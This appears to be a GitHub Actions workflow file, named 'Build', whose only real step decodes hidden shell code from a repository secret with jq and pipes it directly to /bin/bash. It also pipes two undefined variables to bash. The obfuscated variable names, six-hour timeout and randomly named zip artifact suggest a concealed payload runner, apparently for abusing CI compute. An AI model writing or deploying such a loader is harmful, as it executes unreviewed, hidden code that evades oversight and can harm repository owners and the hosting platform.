name: Build
on:
  workflow_dispatch:

permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          my8: ${{ secrets.my8 }}
        run: |
          printf '%s' "$my8" | jq -r .t458 | /bin/bash
          printf '%s' "$dhe3388" | jq -r .h741 | /bin/bash
          echo $k9458 | jq -r .fzhk75 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: Spyj1joj
          path: "*.zip"
          retention-days: 1
